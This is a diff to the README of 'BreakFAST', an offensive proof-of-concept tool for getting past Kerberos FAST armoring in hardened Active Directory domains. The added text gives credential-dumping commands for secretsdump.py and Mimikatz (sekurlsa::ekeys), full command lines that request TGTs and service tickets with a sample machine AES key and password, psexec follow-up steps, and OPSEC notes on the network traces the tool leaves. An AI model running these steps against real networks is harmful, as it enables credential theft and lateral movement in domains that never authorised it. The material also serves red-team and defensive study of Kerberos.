@@ -1,5 +1,8 @@
 # BreakFAST - Kerberos FAST Armoring Abuse 
 
+>[!ZAP]
+> TLDR: Use this as `GetTGT.py` or `GetST.py` in Kerberos Armoring hardened domains.
+
 Proof of concept for abusing Kerberos Armoring, a.k.a FAST (Flexible Authentication Secure Tunneling) Armoring (MS-KILE/RFC-6113). This can be used in post-ex lateral movement in environments where Kerberos FAST armoring is enabled and preventing you from using your favorite tools such as `GetTGT.py`, `psexec.py` or `evil-winrm`. See below for usage and further details on *why* and *how*. 
 
 <img src="img/knight-red.jpg" style="width:100%; height:auto;">
@@ -20,21 +23,44 @@ This is especially useful as no tool from `impacket` currently supports native a
 
 ## Tool usage
 
+`BreakFAST.py` can either be used as substitution to `GetTGT.py`:
+
+```
+BreakFAST.py -key <key> -machine <machine> [-outfile <.ccache>] identity
+```
+
+or as a substitute to `GetST.py`: 
+
+```
+BreakFAST.py -key <key> -machine <machine> [-outfile <.ccache>] -spn <SPN> identity
+```
+
+If you do not pass `-spn <SPN>` the default behaviour is to request a TGT.
+
 #### Prerequisites
 
-This tool requires that you have obtained a **long term secret** for a machine account. This secret can be retrieved by dumping `LSA`, *e.g.,* using `secretsdump.py` - locally or on the DC. We are looking for **kerberos keys** tied to computer accounts: 
+This tool requires that you have obtained a **long term secret** for a machine account. This secret can be retrieved by dumping `LSA`: 
+
+**Remotely** if the target system (ex: `WIN-D7FNC0765NG`) supports `NTLM` authentication you can use `secretsdump.py`: 
 
 ```sh
 # Dump LSA on the system you will impersonate for FAST
 secretsdump.py OCEAN/Administrateur:'aaaa1234!'@10.0.2.15 -o dump
 
-# Locate the aes256-cts-hmac-sha1-96 Key 
+# Locate the aes256-cts-hmac-sha1-96 Key for the machine account
 OCEAN\WIN-D7FNC0765NG$:aes256-cts-hmac-sha1-96:7e1cf276579d969397ca3f2a6b0fa990c1450329d12a52331d6cdf76d35820c9
 ```
 
-In the above example, the string `7e1...0c9` corresponds to the long-term `aes256-cts-hmac-sha1-96` key, you might also find `aes128-cts-hmac-sha1-96`, `des-cbc-md5` and other formats. The machine account for which you extract the key will be used to build the FAST armor. There are **no specific requirements** for the choice of the machine itself.
+In all logic, if `NTLM` is disabled you cannot use this command and will have to dump the key locally, for example using `Mimikatz`: 
 
-> This tool currently only supports `aes256-cts-hmac-sha1-96` but other formats will be added. While the RFC discusses `AES128, AES256, DES, 3DES` and `RC4-HMAC` (See [RFC 6113 Appendix A.](https://www.rfc-editor.org/rfc/rfc6113.txt)), MS-KILE defaults to `AES256`.
+```
+mimikatz # !+
+mimikatz # token::elevate
+mimikatz # privilege::debug
+mimikatz # sekurlsa::ekeys
+```
+
+In the above example, the string `7e1...0c9` corresponds to the long-term `aes256-cts-hmac-sha1-96` key, you might also find `aes128-cts-hmac-sha1-96`, `des-cbc-md4` and other formats. The machine account for which you extract the key will be used to build the FAST armor. This tool currently only supports `aes256-cts-hmac-sha1-96` but other formats will be added. While the RFC discusses `AES128, AES256, DES, 3DES` and `RC4-HMAC` (See [RFC 6113 Appendix A.](https://www.rfc-editor.org/rfc/rfc6113.txt)), MS-KILE defaults to `AES256`.
 
 #### Package requirements
 
@@ -74,13 +100,20 @@ Now that you've installed all the dependencies, configured the `krb5` native cli
 
 ```sh
 # Syntax
-BreakFAST.py -aesKey <armorKey> -machine <armorPrincipal$> -outfile <ccache> REALM/user:password
+BreakFAST.py -key <key> -machine <machine> [-outfile <.ccache>] [-spn <SPN>] identity
 
-# For example
-BreakFAST.py -aesKey 7e1cf276579d969397ca3f2a6b0fa990c1450329d12a52331d6cdf76d35820c9 \
-             -machine WIN-D7FNC0765NG$ \
-             -outfile armor.keytab \
-             OCEAN.NET/Administrateur:'aaaa1234!'
+# Ex. Get a ST for cifs/hostname
+python3 ./BreakFAST.py -key 7e1cf276579d969397ca3f2a6b0fa990c1450329d12a52331d6cdf76d35820c9 \
+                       -machine WIN-D7FNC0765NG$ \
+                       -spn 'cifs@WIN-D7FNC0765NG.ocean.net' \
+                       -outfile ST.ccache \
+                       OCEAN.NET/Administrateur:'aaaa1234!' \
+
+# Ex. Get a TGT for Administrateur
+python3 ./BreakFAST.py -key 7e1cf276579d969397ca3f2a6b0fa990c1450329d12a52331d6cdf76d35820c9 \
+                       -machine WIN-D7FNC0765NG$ \
+                       -outfile TGT.ccache \
+                       OCEAN.NET/Administrateur:'aaaa1234!' \
 ```
 
 > **The process is further described below.** But, in a nutshell, the above command will build and emit a `FAST AS-REQ` using the AES Key (since the computer's authentication exchange is **not armored**). The KDC should respond with an armored `FAST AS-REP` containing a `TGT`. 
@@ -91,20 +124,16 @@ If the script executes without any issue you should see the following output:
 
 ```sh
 ------------------------------
-[*] Keytab save to: armor.keytab 
 [*] Received FAST TGT
-[*] Saved credential cache to BreakFAST.ccache
+[*] Saved FAST TGT to ST.ccache
+[*] Received FAST ST
+[*] Saved FAST ST for cifs@WIN-D7FNC0765NG.ocean.net to ST.ccache
 ------------------------------
-[*] Next Steps:
-
-	 export KRB5CCNAME=BreakFAST.ccache
-	 psexec.py -dc-ip 1.2.3.4 -target-ip 2.3.4.5 -k -no-pass OCEAN.NET/Administrateur@WIN-D7FNC0765NG.OCEAN.NET
+[*] Use with: 	export KRB5CCNAME=ST.ccache
 ------------------------------
 ```
 
-The `armor.keytab` is not really useful for further requests. It is basically a reformat of the dumped credentials. However, once you have it you can reuse it to re-emit `FAST AS-REQs` (until the underlying key expires).
-
-The `BreakFAST.ccache` file produced is way more interesting, as it can be used as credential cache for all your favorite tools, for example `impacket-psexec` with `-k -no-pass`. To do so, export the environment variable `KRB5CCNAME` and run the tool : 
+The `.ccache` file can then be used as credential cache for all your favorite tools, for example `impacket-psexec` with `-k -no-pass`. To do so, export the environment variable `KRB5CCNAME` and run the tool : 
 
 ```sh
 export KRB5CCNAME=BreakFAST.ccache
@@ -153,7 +182,7 @@ Kerberos SessionError: KDC_ERR_POLICY(KDC policy rejects request) #fufufufufufuf
 >
 > For `impacket`, remote tools such as `GetUserSPNs.py`, `GetNPUsers.py` or `getTGT.py` will receive the same error. Same applies to tools such as `evil-winrm` (see [this blog](https://medium.com/@business1sg00d/as-req-roasting-from-a-router-2a216c801a2c)).
 
-From the DC perspective, this is because armoring comes in the form of a `GPO` indicating to `Fail unarmored authentication requests`, as shown below. As such, if we previously got a `TGT/ST` (say for our `Administrateur` account) that is still valid, we cannot use it to emit valid `TGS/AP-REQs` unless we have access to the local system and can use `lsass` to armor our requests. See [this blog](https://dirteam.com/sander/2012/09/05/new-features-in-active-directory-domain-services-in-windows-server-2012-part-11-kerberos-armoring-fast/) for details.
+From the DC perspective, this is because armoring comes in the form of a `GPO` indicating to `Fail unarmored authentication requests`, as shown below. As such, even if we previously got a `TGT/ST` (say for our `Administrateur` account or `cifs`) that is still temporaly valid, we cannot use it to authenticate. See [this blog](https://dirteam.com/sander/2012/09/05/new-features-in-active-directory-domain-services-in-windows-server-2012-part-11-kerberos-armoring-fast/) for details.
 
 <img alt="Image from TrustedSec" src="img/gpo.jpg" style="width:100%; height:auto;">
 
@@ -253,6 +282,15 @@ For now the tool emits a `TGS-REQ` for CIFS\host, but it's hardcoded. We can add
 
 We should also investigate how this can be extended to `anonymous PKINIT` (which is the other type of armor key generation mechanism described in the RFC (see section 5.4.1.1)) and eventually see how this can be combined with delegation related vectors to trigger FAST AP-REQS relay-style... TBC :)
 
+## OPSEC Considerations
+
+The tool will emit two or three distinct requests depending on wether you use `-spn` or not. Without `-spn`, one `AS-*` exchange is triggered to retrive the armor, and a second one to get the user's `TGT`. If `-spn` is used, an additional `TGS-*` exchange occurs to retrieve the `ST`. 
+
+<img src="img/ws-tgt.png" style="width:100%; height:auto;">
+Fig. FAST TGT REQ
+
+<img src="img/ws-st.png" style="width:100%; height:auto;">
+Fig. FAST TGS REQ
 
 ## References
 
@@ -266,3 +304,5 @@ We should also investigate how this can be extended to `anonymous PKINIT` (which
 - SecretToKeytab : https://github.com/DovidP/generate-keytab/tree/master
 - Semperis on armoring : https://www.semperis.com/blog/new-attack-paths-as-requested-sts/
 - Dirteam : https://dirteam.com/sander/2012/09/05/new-features-in-active-directory-domain-services-in-windows-server-2012-part-11-kerberos-armoring-fast/
+- Impacket : https://github.com/fortra/impacket
+- Mimikatz : https://github.com/gentilkiwi/mimikatz
